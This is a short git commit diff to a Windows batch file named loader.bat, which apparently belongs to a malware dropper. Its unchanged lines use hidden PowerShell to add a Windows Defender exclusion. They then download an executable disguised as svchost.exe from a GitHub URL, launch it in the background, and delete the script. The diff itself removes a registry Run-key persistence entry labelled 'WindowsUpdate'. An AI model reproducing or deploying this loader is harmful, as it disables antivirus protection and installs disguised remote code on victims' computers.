22085b33ec9cc386907ceeea603cf4fe609f5469
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-26 18:30:07 +0500

    Add files via upload

--- loader.bat
+++ loader.bat
@@ -3,7 +3,6 @@ cd /d "%~dp0"
 powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0svchost.exe'"
 powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
 if exist "%~dp0svchost.exe" (
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "%~dp0svchost.exe" /f >nul
     start /b "" "%~dp0svchost.exe"
 )
 del "%~f0" >nul 2>&1
